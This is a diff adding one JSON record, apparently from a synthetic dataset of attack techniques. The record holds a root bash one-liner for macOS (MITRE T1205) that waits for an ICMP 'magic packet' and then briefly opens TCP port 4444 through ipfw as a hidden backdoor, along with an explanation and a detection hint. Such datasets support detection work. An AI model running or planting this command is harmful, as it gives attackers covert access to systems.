@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i en0 -c 1 \"icmp and icmp[8:4] = 0x4f50454e and icmp[12:4] = 0x504f5254\" >/dev/null && ipfw add 210 allow tcp from any to me 4444 in; sleep 90; ipfw delete 210'",
+  "explanation": "Listens for an ICMP echo-request carrying magic payload \"OPENPORT\" (0x4f50454e504f5254) and opens TCP 4444 via ipfw for 90 seconds. Traffic signaling via a magic packet; requires root.",
+  "rationale_steps": [
+    "Use tcpdump BPF to match specific ICMP payload bytes as a covert signal.",
+    "On match, add ipfw rule enabling a hidden backdoor port briefly.",
+    "Detection: alert on ICMP with unusual payloads, and correlate with new ipfw rules or sudden ephemeral service exposure on 4444."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-990a38ea",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
